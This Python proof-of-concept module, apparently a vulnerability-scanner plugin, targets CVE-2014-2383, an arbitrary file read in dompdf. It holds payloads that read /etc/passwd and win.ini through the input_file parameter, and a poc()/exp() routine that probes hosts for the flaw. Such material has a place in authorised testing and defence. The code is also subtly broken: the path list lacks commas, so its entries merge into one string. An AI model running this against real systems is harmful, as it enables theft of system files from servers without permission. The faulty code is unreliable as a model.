import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Arbitrary file read in dompdf < v0.6.0''',
        "description": '''A vulnerability in dompdf.php in dompdf before 0.6.1, when DOMPDF_ENABLE_PHP is enabled, allows context-dependent attackers to bypass chroot protections and read arbitrary files via a PHP protocol and wrappers in the input_file parameter, as demonstrated by a php://filter/read=convert.base64-encode/resource in the input_file parameter.''',
        "severity": "high",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2014-2383", 
            "https://www.exploit-db.com/exploits/33004"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "CVE-2014-2383",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            "win-payload":'''/dompdf.php?input_file=C:/windows/win.ini''',
            "unix-payload":'''/dompdf.php?input_file=/etc/passwd'''
        },
        "tags": ["cve", "cve2014", "dompdf", "lfi"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        paths = [
            "/dompdf.php?input_file=dompdf.php"
            "/PhpSpreadsheet/Writer/PDF/DomPDF.php?input_file=dompdf.php"
            "/lib/dompdf/dompdf.php?input_file=dompdf.php"
            "/includes/dompdf/dompdf.php?input_file=dompdf.php"
        ]
        
        for path in paths:
            resp = requests.get(url+path, timeout=10, verify=False, allow_redirects=False)
            if resp.status_code == 200 and "application/pdf" in str(resp.headers) and 'filename="dompdf_out.pdf"' in str(resp.headers):
                result["success"] = True
                result["info"] = info()
                result["payload"] = url+path

                return result

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url